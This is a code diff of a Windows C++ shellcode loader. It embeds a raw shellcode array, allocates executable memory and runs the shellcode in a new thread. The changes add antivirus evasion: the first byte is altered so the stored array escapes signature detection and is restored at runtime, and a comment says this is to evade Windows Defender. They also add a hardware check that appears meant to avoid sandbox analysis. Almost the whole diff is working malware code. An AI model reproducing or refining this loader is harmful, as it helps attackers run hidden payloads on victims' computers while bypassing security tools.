@@ -1,9 +1,10 @@
 #include <Windows.h>
+#include "CheckHardware.h"
 
-int main()
+void Run()
 {
-	constexpr char code[] =
-		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
+	unsigned char code[] =
+		"\xfd\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
 		"\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
 		"\x56\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50"
 		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
@@ -41,11 +42,30 @@ int main()
 		"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
 		"\xf0\xb5\xa2\x56\xff\xd5";
 
+	unsigned char first[] = "\xfc";
+
 	PVOID pCode = VirtualAlloc(0, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	// switch first bad byte to evade windows defender
+	RtlCopyMemory(code, first, sizeof first);
 	RtlCopyMemory(pCode, code, sizeof code);
 	DWORD threadID;
 	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)pCode, NULL, 0, &threadID);
 	WaitForSingleObject(hThread, INFINITE);
+}
 
+void ShowMessageBox(LPCSTR text)
+{
+	MessageBoxA(0, text, "STOPPED", MB_OK);
+}
+
+int main()
+{
+	if (!CheckHardware())
+	{
+		ShowMessageBox("CPU/RAM/HDD check failed!");
+		return 0;
+	}
+	
+	Run();
 	return 0;
 }
